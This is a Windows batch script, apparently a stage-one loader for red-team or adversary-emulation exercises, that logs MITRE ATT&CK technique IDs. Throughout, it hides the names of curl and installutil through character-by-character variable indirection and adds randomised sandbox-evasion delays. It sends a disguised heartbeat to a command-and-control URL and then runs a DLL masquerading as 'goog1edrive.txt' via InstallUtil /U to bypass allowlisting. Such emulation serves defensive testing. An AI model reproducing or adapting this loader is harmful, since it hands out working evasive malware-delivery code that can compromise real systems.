@echo off
SETLOCAL EnableDelayedExpansion

REM Random constant names with PHR_ as values
SET zxvbn=%APPDATA%\7996\17a460fd
SET kjhgf=https://10.0.0.49
SET lpoiu=https://10.0.0.49/stage/2/icon.png?7996-7
SET mnbvc=ITZEL-S2BO
SET qazws=7
SET xswed=goog1edrive.txt
SET cvfrp=7996

REM Setup logging directory - FIXED: Quoted path assignment
SET "tgbnm=%APPDATA%\!qazws!"
SET "yhnjm=!tgbnm!\macula-simulations.log"
IF NOT EXIST "!tgbnm!" MD "!tgbnm!" >nul 2>&1

echo [!DATE! !TIME!][DEBUG][!mnbvc!]: Initializing Stage1 DLL execution >> "!yhnjm!" 2>nul

REM Initial delay 30-60s using timeout
SET /A idel=!RANDOM! %% 31 + 30
echo [!DATE! !TIME!][DEBUG][!mnbvc!]: Initial delay start !idel!s >> "!yhnjm!" 2>nul
timeout /t !idel! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!mnbvc!]: Initial delay complete >> "!yhnjm!" 2>nul

REM Obfuscated curl command using multi-layer variable indirection
SET a0=c
SET a1=u
SET a2=r
SET a3=l
SET a4=.exe
SET curlpart=!a0!!a1!!a2!!a3!!a4!
SET curlref1=curlpart

REM Build curl executable reference with nested expansion
CALL SET curlcmd=%%!curlref1!%%

REM Obfuscated installutil command using array-style variables
SET b0=i
SET b1=n
SET b2=s
SET b3=t
SET b4=a
SET b5=l
SET b6=l
SET b7=u
SET b8=t
SET b9=i
SET b10=l
SET b11=.exe
SET instpart=!b0!!b1!!b2!!b3!!b4!!b5!!b6!!b7!!b8!!b9!!b10!!b11!
SET instref1=instpart

REM Obfuscated arguments with multiple indirection layers
SET c0=/
SET c1=l
SET c2=o
SET c3=g
SET c4=f
SET c5=i
SET c6=l
SET c7=e
SET c8==
SET d0= /
SET d1=L
SET d2=o
SET d3=g
SET d4=T
SET d5=o
SET d6=C
SET d7=o
SET d8=n
SET d9=s
SET d10=o
SET d11=l
SET d12=e
SET d13==
SET d14=f
SET d15=a
SET d16=l
SET d17=s
SET d18=e
SET e0= /
SET e1=U
CALL SET arg1=%%c0%%c1%%c2%%c3%%c4%%c5%%c6%%c7%%c8%%
CALL SET arg2=%%d0%%d1%%d2%%d3%%d4%%d5%%d6%%d7%%d8%%d9%%d10%%d11%%d12%%d13%%d14%%d15%%d16%%d17%%d18%%
CALL SET arg3=%%e0%%e1%%
SET argfull=!arg1!!arg2!!arg3!

REM Pre-heartbeat delay 5-15s using ping
SET /A pdel=!RANDOM! %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!mnbvc!]: Pre-heartbeat delay !pdel!s >> "!yhnjm!" 2>nul
ping -n !pdel! 127.0.0.1 >nul

REM C2 heartbeat check
echo [!DATE! !TIME!][DEBUG][!mnbvc!]: Heartbeat check start >> "!yhnjm!" 2>nul
SET hbresult=0
SET hberror=

REM Execute curl with proper URL, timeout, and additional stealth headers
!curlcmd! -k -s -o nul --connect-timeout 30 --max-time 60 --silent --max-redirs 0 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "!lpoiu!"
IF !ERRORLEVEL! EQU 0 (
    SET hbresult=1
) ELSE (
    SET hberror=connection_failed_!ERRORLEVEL!
)

REM Format timestamp for TTP logging using WMIC for locale-independent parsing
FOR /F "tokens=2 delims==." %%T IN ('wmic os get localdatetime /value') DO SET datetime=%%T
SET yyyy=!datetime:~0,4!
SET mm=!datetime:~4,2!
SET dd=!datetime:~6,2!
SET hh=!datetime:~8,2!
SET min=!datetime:~10,2!
SET sec=!datetime:~12,2!
SET msec=!datetime:~15,3!
SET fullts=!yyyy!-!mm!-!dd! !hh!:!min!:!sec!.!msec!

REM Log TTP T1105 heartbeat result
echo [!fullts!][!mnbvc!]: !qazws!-!cvfrp!-T1105|Ingress Tool Transfer=!hbresult!:!hberror! >> "!yhnjm!" 2>&1

IF !hbresult! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!mnbvc!]: Heartbeat failed, exiting >> "!yhnjm!" 2>nul
    EXIT /B 1
)

echo [!DATE! !TIME!][DEBUG][!mnbvc!]: Heartbeat successful >> "!yhnjm!" 2>nul

REM Random delay 5-15s using CHOICE
SET /A cdel=!RANDOM! %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!mnbvc!]: Pre-directory change delay !cdel!s >> "!yhnjm!" 2>nul
CHOICE /C Y /N /D Y /T !cdel! >nul

REM Change to output directory
echo [!DATE! !TIME!][DEBUG][!mnbvc!]: Changing to directory !zxvbn! >> "!yhnjm!" 2>nul
CD /D "!zxvbn!" >nul 2>&1
IF !ERRORLEVEL! NEQ 0 (
    echo [!DATE! !TIME!][DEBUG][!mnbvc!]: Directory change failed >> "!yhnjm!" 2>nul
    SET execresult=0
    SET exerror=path_not_found
    GOTO :logexec
)

REM Random delay 10-30s using timeout
SET /A rdelay=!RANDOM! %% 21 + 10
echo [!DATE! !TIME!][DEBUG][!mnbvc!]: Random delay !rdelay!s before execution >> "!yhnjm!" 2>nul
timeout /t !rdelay! /nobreak >nul

REM Execute DLL via installutil with full .NET Framework path
echo [!DATE! !TIME!][DEBUG][!mnbvc!]: Starting DLL execution >> "!yhnjm!" 2>nul
SET execresult=0
SET exerror=

REM Build full path to installutil with indirection
SET netpart1=%WINDIR%
SET netpart2=\Microsoft.NET\Framework64\v4.0.30319\
SET netpath=!netpart1!!netpart2!
CALL SET instexe=%%instref1%%
SET fullinst=!netpath!!instexe!

REM Execute installutil with proper spacing between arguments - FIXED: Added space
echo [!DATE! !TIME!][DEBUG][!mnbvc!]: Executing: !fullinst! !argfull! "!xswed!" >> "!yhnjm!" 2>nul
!fullinst! !argfull! "!xswed!"
IF !ERRORLEVEL! EQU 0 (
    SET execresult=1
) ELSE (
    SET exerror=assembly_load_failed_!ERRORLEVEL!
)

:logexec
REM Log TTP T1218 execution result - FIXED: exerror is now always initialized
echo [!fullts!][!mnbvc!]: !qazws!-!cvfrp!-T1218|Signed Binary Proxy Execution=!execresult!:!exerror! >> "!yhnjm!" 2>&1

IF !execresult! EQU 1 (
    echo [!DATE! !TIME!][DEBUG][!mnbvc!]: DLL execution completed >> "!yhnjm!" 2>nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!mnbvc!]: DLL execution failed: !exerror! >> "!yhnjm!" 2>nul
)

REM Final cleanup delay 5-15s using ping
SET /A fdel=!RANDOM! %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!mnbvc!]: Final cleanup delay !fdel!s >> "!yhnjm!" 2>nul
ping -n !fdel! 127.0.0.1 >nul

echo [!DATE! !TIME!][DEBUG][!mnbvc!]: Stage1 complete >> "!yhnjm!" 2>nul

ENDLOCAL
EXIT /B 0